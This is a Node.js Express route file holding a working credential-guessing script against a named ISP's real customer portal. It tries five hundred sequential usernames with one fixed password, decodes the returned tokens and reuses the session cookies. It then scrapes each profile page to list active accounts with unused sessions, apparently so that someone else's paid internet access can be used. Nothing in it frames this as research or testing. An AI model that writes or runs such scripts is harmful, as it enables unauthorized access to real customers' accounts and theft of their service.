const router = require('express').Router();
const axios = require('axios')
const jwt_decode = require('jwt-decode');

router.get('/a', async(req,res)=>{
    let arr=[]
  for (i=1900;i<2400;i++){
    try{
    
  
      // Post the form, just make sure to set the 'Content-Type' header
      
      await axios({
          method:"POST",
          url: 'https://myaccount.rathnaaspectra.com/customer_portal/login',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded ; charset=UTF-8',"sec-ch-ua":'" Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"', "sec-ch-ua-mobile":"?1","User-Agent":"Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Mobile Safari/537.36" },
          data: formUrlEncoded({
              username: 'rsplf'+i,
              accountName: 'rathnaspectra',
              password: '123654',
            
          })
          
        })
        .then(function async(response) {
          const cookie= response.headers["set-cookie"][0]
          if(response.data.message!==[]){
              var decoded = jwt_decode(response.data.message);
          }
           axios({
              method:"GET",
              url: 'https://myaccount.rathnaaspectra.com/captive_portal/view_profile/',
              headers: { 'Cookie':cookie,'Content-Type': 'application/x-www-form-urlencoded ; charset=UTF-8',
              "sec-ch-ua":'" Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"', "sec-ch-ua-mobile":"?1",
              "Accept":"*/*","Host":"myaccount.rathnaaspectra.com","Referer":"https://myaccount.rathnaaspectra.com/customer_portal",
              "Sec-Fetch-Dest":"document","Sec-Fetch-Mode":"navigate",
              "Sec-Fetch-Site":"same-origin","Upgrade-Insecure-Requests":"1",
              "Sec-Fetch-User":"?1",
              "User-Agent":"Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Mobile Safari/537.36" },
  
            })
            .then(function(response) {
              const data =response.data.toString().replace(' ', '')
              const data1 =data.split("  <td>Sessions</td>")[1]
              const plan = data.split("<td>Plan name</td>")[1]
              const data2 = data1.split("<td>")[1].replace(" ","")
              const plan1 = plan.split("<td>")[1]
              const plan2= plan1.split(" ")[49]
              const s=JSON.stringify(data2).split(" ")[51]
              if(s==="0/1" && decoded.status==="active"){
                arr.push({id:decoded.username,plan:plan2})
                
              }
            })
            .catch(function(error) {
                console.error(error);
              console.log("----------",error)
            })
  
        })
        .catch(function(error) {
          console.log(error)
        })
        
    }
    catch(err){
        console.log(err)
    }
  }
  res.send(arr)
  console.log(arr)
})

const formUrlEncoded = x =>
   Object.keys(x).reduce((p, c) => p + `&${c}=${encodeURIComponent(x[c])}`, '')


        
module.exports= router;